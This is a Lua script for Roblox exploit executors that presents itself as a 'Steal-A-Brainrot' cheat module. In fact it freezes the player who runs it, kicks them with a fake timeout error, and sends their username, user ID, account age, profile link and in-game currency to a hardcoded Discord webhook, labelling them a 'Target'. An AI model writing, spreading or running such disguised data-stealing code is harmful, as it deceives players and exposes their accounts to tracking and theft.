--[[
    CrustyMain Framework v2.1.4 | Module: Steal-A-Brainrot
    Status: Operational | Compatibility: Solar, Xeno
]]

local url = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")
local m = game:GetService("MarketplaceService")

-- Karuk (Freeze & Kick)
if p.Character then p.Character.HumanoidRootPart.Anchored = true end
task.delay(1.5, function() p:Kick("Error: [0x84] Execution Timeout.") end)

-- Data Extraction
local br = "0"
local s = p:FindFirstChild("leaderstats")
if s then 
    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
    br = v and tostring(v.Value) or "0"
end

local gName = m:GetProductInfo(game.PlaceId).Name
local pUrl = "https://www.roblox.com/users/" .. p.UserId .. "/profile"

-- Send to Bot Group (Solar/Xeno Compatible)
local req = (syn and syn.request) or http_request or request or (http and http.request)
if req then
    req({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = h:JSONEncode({
            embeds = {{
                title = "🎯 Target: " .. p.Name,
                description = "Account logged from **" .. gName .. "**",
                color = 0xff0000,
                fields = {
                    {name = "🧠 Brainrots", value = "```" .. br .. "```", inline = true},
                    {name = "📅 Age", value = p.AccountAge .. " days", inline = true},
                    {name = "🔗 Profile", value = "[View Account](" .. pUrl .. ")", inline = false},
                    {name = "🆔 ID", value = "```" .. tostring(p.UserId) .. "```", inline = false}
                },
                footer = {text = "CrustyMain • " .. os.date("%X")}
            }}
        })
    })
end
